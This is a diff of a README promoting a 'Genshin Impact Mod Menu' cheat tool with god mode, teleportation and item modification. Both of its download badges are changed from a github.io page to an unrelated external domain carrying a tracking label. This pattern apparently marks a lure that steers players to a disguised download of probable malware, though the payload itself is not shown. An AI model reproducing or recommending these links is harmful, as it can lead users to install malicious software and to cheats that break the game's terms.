@@ -2,7 +2,7 @@
 
 The **Genshin Impact Mod Menu** is a feature-packed tool designed to unlock advanced gameplay enhancements and quality-of-life improvements. Whether you're farming materials, speedrunning domains, or simply exploring Teyvat without limits, this mod menu offers a customizable interface to tweak nearly every aspect of the game for maximum enjoyment.
 
-[![Download Genshin ModMenu](https://img.shields.io/badge/Download-Genshin%20ModMenu-blueviolet)](https://genshin-mod-menu.github.io/.github/)
+[![Download Genshin ModMenu](https://img.shields.io/badge/Download-Genshin%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 With powerful cheats like god mode, infinite stamina, teleportation, and item modification, players can truly tailor their Genshin experience to their liking—making grinding faster, exploration easier, and combat more exciting.
 
@@ -49,4 +49,4 @@ With powerful cheats like god mode, infinite stamina, teleportation, and item mo
 3. Use the configured hotkey (default `Insert`) to open the menu.
 4. Enable desired features and enjoy full control over your gameplay.
 
-[![Download Genshin ModMenu](https://img.shields.io/badge/Download-Genshin%20ModMenu-blueviolet)](https://genshin-mod-menu.github.io/.github/)
+[![Download Genshin ModMenu](https://img.shields.io/badge/Download-Genshin%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
